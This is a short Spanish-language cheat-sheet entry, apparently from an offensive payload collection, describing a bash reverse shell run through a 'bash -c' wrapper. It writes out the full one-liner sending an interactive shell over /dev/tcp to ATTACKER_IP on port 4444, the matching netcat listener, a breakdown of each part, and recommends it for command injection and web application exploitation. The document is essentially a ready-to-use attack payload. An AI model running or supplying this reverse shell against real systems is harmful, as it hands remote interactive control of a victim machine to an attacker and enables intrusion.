# Bash Reverse Shell — Command Wrapper

## Descripción

Esta variante ejecuta la reverse shell dentro de un **wrapper de bash -c**, útil cuando el entorno de ejecución requiere ejecutar comandos dentro de una cadena.

---

# Comando

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* Bash
* conexión saliente TCP

---

# Explicación

```
bash -c          → ejecuta comando dentro de bash
bash -i          → modo interactivo
/dev/tcp         → conexión TCP
```

---

# Cuándo usarlo

* inyección de comandos
* explotación de aplicaciones web
* ejecución dentro de scripts

---

# Limitaciones

* depende del soporte `/dev/tcp`
